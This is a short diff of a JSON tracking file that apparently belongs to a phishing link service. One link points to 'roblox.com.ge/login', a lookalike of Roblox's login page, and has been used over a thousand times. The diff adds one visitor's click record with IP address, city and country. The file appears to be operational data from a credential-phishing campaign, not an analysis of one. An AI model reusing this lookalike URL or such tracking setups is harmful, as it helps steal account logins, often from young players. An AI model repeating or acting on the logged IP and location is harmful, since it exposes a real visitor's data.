@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1194,
+    "useCount": 1195,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9696,6 +9696,14 @@
         "city": "Olongapo City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777303294769,
+        "ip": "79.162.24.144",
+        "country": "Poland",
+        "city": "Torun",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
